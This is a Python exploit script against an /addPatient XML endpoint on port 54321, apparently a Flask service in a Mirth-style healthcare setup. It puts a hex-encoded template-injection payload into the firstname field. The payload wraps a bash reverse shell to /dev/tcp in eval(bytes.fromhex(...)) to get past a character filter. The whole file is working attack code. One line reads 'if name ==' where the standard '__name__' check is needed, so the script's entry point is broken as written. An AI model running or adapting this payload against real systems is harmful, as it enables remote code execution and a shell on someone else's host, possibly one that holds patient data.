#!/usr/bin/env python3
import urllib.request
import binascii
import sys

def generate_payload(lhost, lport):
    """
    Generates a Hex-encoded SSTI payload to bypass alphanumeric regex.
    """
    # Standard Bash Reverse Shell
    bash_command = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    # Python command to execute the bash shell
    python_cmd = f"__import__('os').system('bash -c \"{bash_command}\"')"
    
    # Hex encode the entire command to bypass character filters
    hex_cmd = binascii.hexlify(python_cmd.encode()).decode()
    
    # Wrap in eval() and bytes.fromhex() to trigger execution inside the f-string
    return "{" + f"eval(bytes.fromhex('{hex_cmd}').decode())" + "}"

def send_exploit(target_ip, lhost, lport):
    url = f"http://{target_ip}:54321/addPatient"
    payload = generate_payload(lhost, lport)
    
    # Constructing the XML data as expected by the Flask server
    xml_data = f"""<patient>
    <firstname>{payload}</firstname>
    <lastname>Rohit</lastname>
    <sender_app>Mirth</sender_app>
    <timestamp>2026</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>M</gender>
</patient>"""

    headers = {'Content-Type': 'application/xml'}
    req = urllib.request.Request(url, data=xml_data.encode(), headers=headers)

    print(f"[*] Target: {url}")
    print(f"[*] Payload: {payload}")
    print(f"[*] Sending exploit to catch shell on {lhost}:{lport}...")

    try:
        # We don't need to read the response if the shell connects successfully
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        # A timeout or connection reset is often a sign of a successful reverse shell
        print(f"[!] Check your listener! (Interaction result: {e})")

if name == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: python3 {sys.argv[0]} <TARGET_IP> <YOUR_IP> <YOUR_PORT>")
        sys.exit(1)

    target_ip = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    
    send_exploit(target_ip, lhost, lport)
